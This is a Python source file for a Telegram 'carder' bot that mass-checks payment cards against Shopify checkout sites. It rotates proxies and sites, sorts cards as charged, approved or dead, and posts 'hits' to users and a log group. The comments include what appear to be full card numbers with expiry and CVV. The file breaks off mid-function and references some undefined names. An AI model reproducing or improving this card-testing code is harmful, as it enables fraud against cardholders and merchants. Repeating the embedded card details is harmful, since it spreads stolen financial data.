import asyncio
import logging
import os
import random
import string
import time
from datetime import datetime, timedelta
from typing import Optional, Tuple
from urllib.parse import urlparse

import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import User, Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, InputFile
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest
from html import escape as html_escape

from proxy import ProxyManager
from database import (
    get_collection,
    save_user_data,
    get_user_data,
    get_bin_info,
    get_sites,
    is_unlimited_msh,
    set_unlimited_msh,
    is_gate_enabled,
    get_proxy_health,
    get_user_credits,
    load_global_proxies_http,
)
from sub import get_premium_status
from mass_gates.sitechk import is_admin
from gates.sh import (
    extract_cards,
    luhn_check,
    parse_card,
    is_expired,
    get_user_plan_name,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

from aiogram import Router

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK FILTERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

from aiogram.filters.callback_data import CallbackData


class MshResultCallback(CallbackData, prefix="msh_result"):
    """Callback for MSH result button clicks"""
    session_id: str
    result_type: str  # "live", "dead", "charged", "all"


class MshStopCallback(CallbackData, prefix="msh_stop"):
    """Callback for MSH stop button"""
    session_id: str


class MshForceStopCallback(CallbackData, prefix="msh_force_stop"):
    """Callback for admin force stop"""
    session_id: str


class MshRetryCallback(CallbackData, prefix="msh_retry"):
    """Callback for MSH retry button"""
    session_id: str


class MshModeCallback(CallbackData, prefix="msh_mode"):
    """Callback for MSH mode selection"""
    pending_id: str
    mode: str  # "charged", "approved", etc.


ADMIN_IDS = {int(id_str) for id_str in os.getenv("ADMIN_IDS", "").split(",") if id_str.strip()}

# Custom Telegram emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "5156781758439490145"
EMOJI_CROWN = "5356394077852933631"
EMOJI_EPIC = "5338843699268095282"
EMOJI_FIRE = "5353854649981596206"
EMOJI_LIGHTNING = "5346063582809315727"
EMOJI_WHITE_STAR = "6321225560789877992"
BTN_LIVE_EMOJI_ID = "5156781758439490145"
BTN_DEAD_EMOJI_ID = "5346063582809315727"
BTN_CHARGED_EMOJI_ID = "5465465194056525619"

EXTRA_CHARGED_GROUP_ID = -1004402375775
EXTRA_CHARGED_GROUP_HANDLE = "@blackulogs"

# Hit log group for logging detected hits
HIT_LOG_GROUP_ID = -1003911344323
HIT_LOG_GROUP_HANDLE = "@blackulogs"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MSH SESSIONS & STATE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MSH_SESSIONS = {}
MSH_PENDING = {}
_PER_USER_API_CONCURRENCY = 7
_GLOBAL_API_SEMAPHORE = asyncio.Semaphore(_PER_USER_API_CONCURRENCY)


def is_session_stopped(session_id: str) -> bool:
    """Check if a session has been stopped by the user."""
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == 'STOPPED'


def _build_hit_caption(
    cc_formatted: str,
    response_msg: str,
    bin_data: dict,
    api_price,
    user_obj,
    plan_name: str,
    is_charged: bool,
    gateway: str = "Unknown",
) -> str:
    """
    Builds the new simplified hit card caption.
    
    Template format:
    CHARGED ── ✅
    4677700002708476|11|2029|421
    GATE ⌁ Shopify Payments 🌐
    CASH ⌁ 0.98 USD
    LOG ⌁ ORDER_PLACED
    BIN ⌁ ZA 🇿🇦 │ ABSA BANK, LTD.
    Checked By: NEPALI BHAI
    """
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    
    safe_response = html_escape(str(response_msg))
    safe_card = html_escape(cc_formatted)
    safe_gateway = html_escape(str(gateway))
    safe_price = html_escape(str(api_price))
    safe_username = html_escape(str(user_obj.first_name or "Unknown"))
    
    # Status line
    if is_charged:
        status_line = "CHARGED ── ✅"
    else:
        # For approved: show the response (3D, Insufficient, etc.)
        status_line = f"{safe_response} ── ✅"
    
    # Build the caption with new simplified template
    caption = (
        f"<b>{status_line}</b>\n"
        f"<code>{safe_card}</code>\n"
        f"GATE ⌁ {safe_gateway} 🌐\n"
        f"CASH ⌁ {safe_price} USD\n"
        f"LOG ⌁ {safe_response}\n"
        f"BIN ⌁ {bin_country} │ {bin_bank}\n"
        f"Checked By: {safe_username}"
    )
    
    return caption
async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the approved hit to the user's DM (private chat)."""
    caption = _build_hit_caption(
        cc_formatted, response_msg, bin_data, api_price,
        user_obj, plan_name, is_charged=False,
    )

    # Send to user's DM as a plain message. The caption already has rich
    # custom Telegram emojis (rendered client-side) — no external GIF URL
    # dependency, so we never hit "wrong type of the web page content".
    await _safe_send_message_dm(
        bot,
        user_obj.id,
        text=caption,
        parse_mode="HTML",
    )

async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the charged hit to the user's DM (private chat) + extra charged group."""
    caption = _build_hit_caption(
        cc_formatted, response_msg, bin_data, api_price,
        user_obj, plan_name, is_charged=True,
    )

    # Send to user's DM as a plain message. The caption already has rich
    # custom Telegram emojis (rendered client-side) — no external GIF URL
    # dependency, so we never hit "wrong type of the web page content".
    dm_msg = await _safe_send_message_dm(
        bot,
        user_obj.id,
        text=caption,
        parse_mode="HTML",
    )
    if dm_msg is not None:
        try:
            await bot.pin_chat_message(
                chat_id=user_obj.id,
                message_id=dm_msg.message_id,
                disable_notification=True,
            )
        except Exception as pe:
            logging.warning(f"[MSH] Could not pin charged hit for user {user_obj.id}: {pe}")

    # Also send to extra charged group log (plain message — same reason).
    try:
        await bot.send_message(
            chat_id=EXTRA_CHARGED_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.error(f"Could not send charged hit to extra group {EXTRA_CHARGED_GROUP_ID}: {e}")
    except Exception as e:
        logging.error(f"Error sending HIT to extra group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    """
    PHASE 2 REDESIGN: Updated button layout with new controls
    - Removed 8 old buttons: Live, Dead, Charged, All, Retry
    - Added 3 new buttons: STOP, Error, START_AGAIN
    """
    session = MSH_SESSIONS.get(session_id, {})

    approved_count = session.get('approved', 0)
    charged_count = session.get('charged', 0)
    error_count = session.get('errors', 0)

    buttons = []

    # ROW 1: Result filters (compact)
    buttons.append([
        {
            "text": f"🔥 Cʜᴀʀɢᴇᴅ ({charged_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(),
            "style": "success",
            "icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID
        },
        {
            "text": f"✅ Aᴘᴘʀᴏᴠᴇᴅ ({approved_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(),
            "style": "primary",
            "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID
        }
    ])

    # ROW 2: Control buttons (NEW - PHASE 2)
    if is_running:
        buttons.append([
            {
                "text": "⏹️ STOP",
                "callback_data": MshStopCallback(session_id=session_id).pack(),
                "style": "danger",
                "icon_custom_emoji_id": BTN_STOP_EMOJI_ID
            }
        ])
    else:
        # After check completes: Show Error and Restart options
        if error_count > 0:
            buttons.append([
                {
                    "text": f"⚠️ Error ({error_count})",
                    "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(),
                    "style": "danger"
                },
                {
                    "text": "🔄 START_AGAIN",
                    "callback_data": MshRetryCallback(session_id=session_id).pack(),
                    "style": "success"
                }
            ])

    return {"inline_keyboard": buttons}
async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    last_checked_count = session.get('last_update_checked', 0)
    cooldown_until = session.get('telegram_cooldown_until', 0)
    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"
    checked = session.get('checked', 0)
    charged = session.get('charged', 0)
    approved = session.get('approved', 0)

    # ━━━ FORCE-UPDATE CONDITIONS ━━━━━━━━━━━━━━━━━━━━━━━
    # These override the throttle/cooldown so critical changes reach the
    # user even when Telegram is being aggressive with flood control.
    force_update = False
    force_reason = None

    # A) New charge or approved since last update → MUST show immediately,
    #    otherwise the user thinks the bot is broken / charges are lost.
    last_charged = session.get('last_update_charged', 0)
    last_approved = session.get('last_update_approved', 0)
    if charged > last_charged or approved > last_approved:
        force_update = True
        force_reason = (
            f"new {'charge' if charged > last_charged else ''}"
            f"{' + ' if charged > last_charged and approved > last_approved else ''}"
            f"{'approved' if approved > last_approved else ''}"
        )

    # B) >20 cards checked since last update → progress bar visibly stale.
    #    Lowered from 50 → 20 so the bar stays current even with high
    #    per-user concurrency (100 workers × 6s = ~16 cards/s).
    if (checked - last_checked_count) >= 20:
        force_update = True
        force_reason = f"+{checked - last_checked_count} cards since last update"

    # C) Last successful update was >4s ago AND counters changed.
    #    Lowered from 8s → 4s so the bar feels live even during throttle
    #    windows. Background updater now ticks at 1.5s so this rarely fires,
    #    but it catches cases where worker updates got rate-limited.
    elapsed_since_update = current_time - last_update
    if elapsed_since_update >= 4.0 and (checked > last_checked_count or charged > last_charged or approved > last_approved):
        force_update = True
        force_reason = f"stale ({elapsed_since_update:.1f}s since last update)"

    # Respect Telegram's RetryAfter cooldown UNLESS this is a forced update.
    # Forced updates WILL try to edit anyway — if Telegram rejects it again
    # the cooldown gets reset, but at least we attempted it.
    if not force_update and current_time < cooldown_until and not is_finished and not is_stopped:
        return

    # Per-session throttle: 1.0s between edits under normal conditions.
    # Forced updates skip this entirely.
    if not is_finished and not is_stopped and not force_update:
        if elapsed_since_update < 1.0:
            return
        # Soft jitter window to desync concurrent sessions
        if elapsed_since_update < 1.0 + random.uniform(0, 0.1):
            return

    text = _build_progress_caption(session, session_id)

    if session.get('last_text') == text:
        return

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running = session['status'] == "CHECKING"
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'],
                message_id=session['msg_id'],
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            session['last_text'] = text
            session['last_update_time'] = current_time
            session['last_update_checked'] = checked
            session['last_update_charged'] = charged
            session['last_update_approved'] = approved
            session['telegram_cooldown_until'] = 0  # clear any stale cooldown
            session['_progress_cooldown_streak'] = 0  # reset flood streak
            if force_update:
                logging.info(
                    f"[MSH] progress force-updated ({force_reason}) for session {session_id}"
                )
        except TelegramRetryAfter as e:
            # Exponential backoff to break the feedback loop: each consecutive
            # flood doubles the cooldown (capped at 15s). Without this, force-
            # updates during cooldown keep hitting Telegram and re-extending
            # the same short cooldown forever, freezing the progress bar.
            retry_seconds = min(15, getattr(e, 'retry_after', 5) or 5)
            prev_failures = session.get('_progress_cooldown_streak', 0) + 1
            cooldown_seconds = min(15, retry_seconds * (2 ** (prev_failures - 1)))
            session['_progress_cooldown_streak'] = prev_failures
            session['telegram_cooldown_until'] = current_time + cooldown_seconds
            logging.info(
                f"[MSH] Telegram flood control on progress edit — "
                f"streak={prev_failures}, cooling down for {cooldown_seconds:.1f}s "
                f"(session {session_id})"
            )
        except TelegramBadRequest as e:
            error_msg = str(e).lower()
            if "message is not modified" not in error_msg and "message to edit not found" not in error_msg:
                logging.error(f"[MSH] Error updating progress: {e}")
            # If the message is gone, mark it so we can send a fresh one
            if "message to edit not found" in error_msg:
                session['_progress_msg_dead'] = True
                logging.warning(
                    f"[MSH] Progress message gone for session {session_id} — "
                    f"will resend on next force-update"
                )
        except Exception as e:
            logging.error(f"[MSH] Error updating progress: {type(e).__name__}: {e}")

        # ━━━ FALLBACK: send a NEW progress message if the old one died ━━━
        # When "message to edit not found" fires (user deleted it, chat
        # was cleared, etc.) we mark the session. On the next call we
        # send a FRESH message instead of editing, so the user still
        # sees live progress. This also helps when the bot's edits
        # silently fail for any reason — a new message is more reliable.
        if session.get('_progress_msg_dead') and not is_finished and not is_stopped:
            try:
                new_msg = await bot.send_message(
                    chat_id=session['chat_id'],
                    text=text,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                )
                session['msg_id'] = new_msg.message_id
                session['_progress_msg_dead'] = False
                session['last_text'] = text
                session['last_update_time'] = current_time
                session['last_update_checked'] = checked
                session['last_update_charged'] = charged
                session['last_update_approved'] = approved
                logging.info(
                    f"[MSH] sent new progress message (replaced dead one) "
                    f"for session {session_id}"
                )
            except Exception as e:
                logging.error(f"[MSH] Failed to resend progress message: {e}")


def _build_progress_caption(session: dict, session_id: str) -> str:
    """
    Builds the premium-looking progress message used by both the initial
    message and every live update during the mass check.
    """
    elapsed = time.time() - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    status = session['status']
    if status == "CHECKING":
        status_emoji = "🔄"
        status_text = f"<i>CHECKING</i>"
    elif status == "STOPPED":
        status_emoji = "🛑"
        status_text = f"<b>STOPPED</b>"
    else:  # FINISHED
        status_emoji = "✅"
        status_text = f"<b>FINISHED</b>"

    checked = session['checked']
    total = session['total']
    approved = session['approved']
    charged = session['charged']
    dead = session['dead']
    errors = session['errors']

    # ━━━ Visual progress bar (14 chars wide) ━━━
    bar_width = 14
    if total > 0:
        filled = max(0, min(bar_width, int(round(bar_width * checked / total))))
    else:
        filled = 0
    empty = bar_width - filled
    progress_bar = "█" * filled + "░" * empty
    pct = int(round(100 * checked / total)) if total > 0 else 0

    proxy_line = ""
    proxy_manager = session.get('proxy_manager')
    if proxy_manager:
        stats = proxy_manager.get_stats()
        proxy_line = (
            f"\n  <tg-emoji emoji-id=\"{EMOJI_LIGHTNING}\">⚡</tg-emoji> "
            f"<b>𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ➛</b> "
            f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">🟢</tg-emoji>'
            f'<code>{stats["active"]}</code>'
            f" / "
            f'<code>{stats["total_proxies"]}</code> active'
        )

    return (
        # ━━━ Header banner ━━━
        f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji> '
        f'<b><a href="https://t.me/blacklistedcarder1">Blacklisted Carder</a></b> '
        f'┇ <tg-emoji emoji-id="{EMOJI_EPIC}">✨</tg-emoji> <i>Premium Checker</i>\n'
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Gateway + Status ━━━
        f'<tg-emoji emoji-id="{EMOJI_FIRE}">🔥</tg-emoji> <b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n'
        f'<tg-emoji emoji-id="{EMOJI_BLUE_TICK}">🎯</tg-emoji> <b>𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> {status_text} {status_emoji}\n'
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Progress bar ━━━
        f'<tg-emoji emoji-id="{EMOJI_WHITE_STAR}">📊</tg-emoji> <b>𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦</b>\n'
        f"<code>[{progress_bar}]</code> <b>{pct}%</b>\n"
        f"<b>𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>{checked}/{total}</code>\n"
        # ━━━ Counts ━━━
        f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji> '
        f'<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>{approved}</b>\n'
        f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji> '
        f'<b>𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➛</b> <b>{charged}</b>\n'
        f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji> '
        f'<b>𝗗𝗲𝗮𝗱 ➛</b> <b>{dead}</b>\n'
        f'<tg-emoji emoji-id="{EMOJI_RED_TICK}">⚠️</tg-emoji> '
        f'<b>𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>{errors}</b>\n'
        f'<tg-emoji emoji-id="{EMOJI_LIGHTNING}">⏱</tg-emoji> '
        f'<b>𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed_str}</b>'
        f"{proxy_line}\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Footer ━━━
        f"🔑 <b>𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>\n"
        f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji> <b>𝗗𝗲𝘃 ➛</b> '
        f'<b><a href="https://t.me/blacklistedcarder1">@blacklistedcarder1</a></b>'
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING - WITH SMART RETRY LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    if is_session_stopped(session_id):
        return

    # Whether the check was started from a group chat
    is_group = session.get('is_group', False)

    # System-level guard — these are infrastructure/session-level issues,
    # NOT per-card errors. We log them but do NOT increment
    # session['errors'] (which is shown in stats alongside dead/charged).
    # Doing so previously caused the "All 📁" file to disagree with the
    # live stats counter (stats +1 but no card added to error_cards →
    # silently invisible in the file report).
    sites_list = session.get('sites_list') or get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty — no sites available for session {session_id}")
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager found for session {session_id}")
        return

    # ══════════════════════════════════════════
    # STATUS CLASSIFICATION RULES
    # ══════════════════════════════════════════

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = "Unknown 🔴"
    bin_data = {}
    used_proxy = None

    MAX_RETRIES = 6
    TRANSIENT_RETRY_MAX = 8
    attempt = 0
    used_sites: set = set()
    transient_retries: int = 0

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    while attempt < MAX_RETRIES:
        if is_session_stopped(session_id):
            return

        attempt += 1

        proxy_result = proxy_manager.get_next_proxy()

        # System-level guard — proxy exhaustion is a session-wide issue,
        # not a per-card error. Log it for diagnostics but don't bump
        # session['errors'] (otherwise the "All 📁" file and live stats
        # counter disagree — stats +1 but no card gets attached to
        # error_cards, so the file silently hides the discrepancy).
        if not proxy_result:
            logging.error(f"[MSH] No proxies available for session {session_id}")
            return

        proxy, is_rotated = proxy_result
        used_proxy = proxy

        if is_session_stopped(session_id):
            return

        available_sites = [s for s in sites_list if s not in used_sites]
        if not available_sites:
            available_sites = sites_list     # fallback if all sites exhausted
        site = _next_site_round_robin(sites_list, used_sites)
        if site is None:
            site = random.choice(available_sites)
        used_sites.add(site)

        if is_session_stopped(session_id):
            return

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy
            )

            if is_session_stopped(session_id):
                return

            if "live" in str(proxy_status_raw).lower():
                proxy_status_formatted = "Live 🟢"
            else:
                proxy_status_formatted = "Dead 🔴"

            api_price = price

            proxy_manager.report_result(proxy, message, http_status)

            message_upper = message.upper()
            message_lower = message.lower()
            # Normalise underscores → spaces so new API ("Card Declined")
            # matches against keywords that use underscores ("CARD_DECLINED")
            message_normalized = message_upper.replace("_", " ")

            # ── 0. NON-RETRYABLE PRODUCT / QUANTITY RESTRICTIONS ────
            # These are REAL responses from the Shopify site (cart-level
            # rules) — NOT proxy errors, NOT site errors. Retrying with a
            # different site might find a working one, but retrying the
            # SAME site is pointless. Treat as DEAD so the card doesn't
            # waste retry budget. Examples:
            #   "You have to buy at least 3 of these items (Green Color)"
            #   "Minimum quantity of 2 required"
            #   "Item is sold out"
            NON_RETRYABLE_PRODUCT_PATTERNS = (
                'buy at least',
                'minimum quantity',
                'quantity of',
                'must purchase',
                'sold out',
                'out of stock',
                'not available for purchase',
            )
            if any(pat in message_lower for pat in NON_RETRYABLE_PRODUCT_PATTERNS):
                result_status = "DEAD"
                response_msg = message
                break

            # ══════════════════════════════════════════════════════
            # STATUS CLASSIFICATION — Shopify1-style pattern
            # ══════════════════════════════════════════════════════

            # ── 1. CHARGED ───────────────────────────────────────
            # "Charged USD X.XX" (new API) / "ORDER_PAID" / "THANK YOU" / etc.
            if (
                "CHARGED" in message_upper
                or "ORDER_PAID" in message_upper
                or "ORDER PLACED" in message_normalized
                or "THANK YOU" in message_upper
            ):
                result_status = "CHARGED"
                response_msg = message
                break

            # ── 2. APPROVED ──────────────────────────────────────
            # "Approved USD X.XX" (new API) / "INSUFFICIENT_FUNDS" /
            # "INCORRECT_CVC" / "INVALID_CVC" (old API) / "3DS" variants
            elif (
                "APPROVED" in message_upper
                or "INSUFFICIENT" in message_lower
                or "INCORRECT_CVC" in message_normalized
                or "INVALID_CVC" in message_normalized
                or "3D_AUTHENTICATION" in message_normalized
                or "3DS_REQUIRED" in message_normalized
                or "3DS" in message_upper
            ):
                result_status = "APPROVED"
                response_msg = message
                break

            # ── 3. EXPLICIT DECLINED keywords ────────────────────
            # Catches things like "CARD_DECLINED", "GENERIC ERROR",
            # "BRAND IS NOT SUPPORTED", etc. Both sides are normalised
            # the same way (underscores -> spaces) so "GENERIC_ERROR"
            # and "GENERIC ERROR" both match the "GENERIC ERROR"
            # pattern in DECLINED_RESPONSES. User-reported: previously
            # this silently failed on the underscore form and the card
            # was counted as ERROR instead of DEAD -- a real Shopify
            # decline showing up as a bot error.
            elif any(
                d.upper().replace("_", " ") in message_normalized
                for d in DECLINED_RESPONSES
            ):
                result_status = "DEAD"
                response_msg = message
                break

            # ── 4. RETRYABLE SITE / CHECKOUT ERROR ────────────────
            # These messages contain "error" but they're actually
            # site/checkout failures — NOT a proxy problem. We must
            # retry on a DIFFERENT site before giving up. Catches
            # things like:
            #   "An error occurred during the checkout process"
            #   "Error processing payment"
            #   "Internal checkout error"
            #   "Store checkout failed"
            #
            # IMPORTANT: this branch runs BEFORE the generic
            # `"ERROR" in message_upper` branch below — otherwise the
            # generic check would short-circuit these into ERROR
            # status with zero retries, which is what happened to
            # the card 4240090003774430|06|29|553.
            elif any(retry_err.lower() in message_lower for retry_err in RETRY_ERRORS):
                if attempt < MAX_RETRIES:
                    logging.info(
                        f"[MSH] Site/Checkout error ({message[:60]}...) - "
                        f"retrying with different site... ({attempt}/{MAX_RETRIES})"
                    )
                    await asyncio.sleep(0.05 + random.uniform(0, 0.05))
                    continue
                else:
                    result_status = "ERROR"
                    response_msg = f"Site Error (retried {MAX_RETRIES}x): {message}"
                    break

            # ── 4b. TRANSIENT "ERROR" / "Site Error! Status: 503" ───
            # User-reported: when the API returns just "ERROR", "Unknown
            # Error", "error: ...", or "<b>Site Error! Status: 503</b>",
            # the failure is usually transient (site overloaded, proxy
            # hiccup, backend bug mid-response). Retry on a DIFFERENT
            # site up to TRANSIENT_RETRY_MAX (8) times before giving up.
            # Once 8 retries are exhausted, fall through to ERROR status
            # so the bot reports it normally instead of looping forever.
            stripped_upper = message_upper.strip()
            is_transient = (
                stripped_upper == "ERROR"
                or stripped_upper == "UNKNOWN ERROR"
                or stripped_upper.startswith("ERROR:")
                or stripped_upper.startswith("ERROR :")
                or "site error! status: 503" in message_lower
            )
            if is_transient:
                transient_retries += 1
                if transient_retries <= TRANSIENT_RETRY_MAX:
                    logging.info(
                        f"[MSH] Transient error ({message[:60]}) - "
                        f"retrying on different site ({transient_retries}/{TRANSIENT_RETRY_MAX})..."
                    )
                    await asyncio.sleep(0.05 + random.uniform(0, 0.05))
                    continue
                else:
                    result_status = "ERROR"
                    response_msg = f"Site Error (retried {TRANSIENT_RETRY_MAX}x): {message}"
                    break

            # ── 5. GENERIC ERROR / proxy / timeout / site errors ─
            # API returned an error-like response — not a real card result
            elif (
                "ERROR" in message_upper
                or "TIMEOUT" in message_upper
                or "error" in message_lower
            ):
                result_status = "ERROR"
                response_msg = message
                break

            # ── 6. Proxy / retry / unknown ───────────────────────
            # Handle proxy errors and any other retryable failures
            # not caught by RETRY_ERRORS (rare edge cases).
            else:
                is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)

                if is_proxy_error:
                    if attempt == MAX_RETRIES:
                        result_status = "ERROR"
                        response_msg = f"Proxy Error: {message}"
                        break
                    else:
                        # Small jittered backoff so concurrent workers don't
                        # all wake at the same instant after a proxy failure.
                        await asyncio.sleep(0.05 + random.uniform(0, 0.10))
                        continue

                # Fallback for anything else: API success flag determines
                # final status. (RETRY_ERRORS matches are now handled in
                # step 4 above — no need to check again here.)
                else:
                    if success is False:
                        result_status = "DEAD"
                    else:
                        result_status = "ERROR"
                    response_msg = message
                    break

        except asyncio.CancelledError:
            raise
        except ProxyDeadError as e:
            if is_session_stopped(session_id):
                return
            # Proxy itself is unreachable (ClientProxyConnectionError /
            # semaphore timeout / etc). Give it a LONG cooldown so it
            # doesnt get re-tested every card, and immediately retry
            # with a fresh proxy. force_dead_cooldown bypasses the
            # escalating 15s->30s ladder and goes straight to several
            # minutes so we dont burn 4x the API timeout per card
            # against the same dead proxy across 2227 cards.
            proxy_manager.force_dead_cooldown(proxy, str(e), cooldown_seconds=120)
            await asyncio.sleep(0.02 + random.uniform(0, 0.05))
            continue
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)

            if attempt == MAX_RETRIES:
                result_status = "ERROR"
                response_msg = "Connection Error"
                proxy_status_formatted = "Error 🔴"
                break
            else:
                # Short jittered backoff — previously a fixed 0.5s which
                # compounded badly across many concurrent failed workers.
                await asyncio.sleep(0.05 + random.uniform(0, 0.10))
                continue

    if is_session_stopped(session_id):
        return

    logging.debug(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")

    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted,
        'response': response_msg,
        'bin_info': bin_data,
        'price': api_price,
        'gateway': 'Shopify',
        'timestamp': datetime.now().isoformat(),
        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A'
    }

    if is_session_stopped(session_id):
        return

    # ── User status flags resolved ONCE at session start (see
    # process_mass_check_background). Avoids per-card sync MongoDB
    # calls that previously blocked the event loop on every card.
    is_adm = session.get('_is_admin_cached', is_admin(user_id))
    is_prem = session.get('_is_premium_cached', False)
    is_unl = session.get('_is_unlimited_cached', False)
    should_charge_credits = (not is_adm) and (not is_prem) and (not is_unl)

    def _schedule_db(coro_factory):
        """
        Fire-and-forget a DB write. We:
          1. Wrap it in _run_bg_db so exceptions are logged.
          2. Keep a strong ref in session['_db_tasks'] so the task is not
             garbage-collected mid-flight (the event loop also holds a
             weak ref, so this is belt-and-suspenders).
        The user-visible DM is NOT blocked on this — it runs in background.
        """
        task = asyncio.create_task(_run_bg_db(coro_factory))
        session.setdefault('_db_tasks', []).append(task)
        return task

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        # DB writes run in background — DON'T await them here, otherwise
        # slow MongoDB latency on Railway delays the user-visible DM.
        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, True))
        _schedule_db(lambda: asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name))
        if should_charge_credits:
            _schedule_db(lambda: asyncio.to_thread(deduct_credits_atomic, user_id, 2))

        if is_session_stopped(session_id):
            return

        # Send DM + group log FIRST so user sees charge instantly.
        await asyncio.gather(
            send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price),
            send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name),
        )

    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)

        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, True))
        if should_charge_credits:
            _schedule_db(lambda: asyncio.to_thread(deduct_credits_atomic, user_id, 1))

        if is_session_stopped(session_id):
            return

        # In "charged_only" mode, skip the approved DM — user only wants charged hits
        if session.get('notify_mode') != "charged_only":
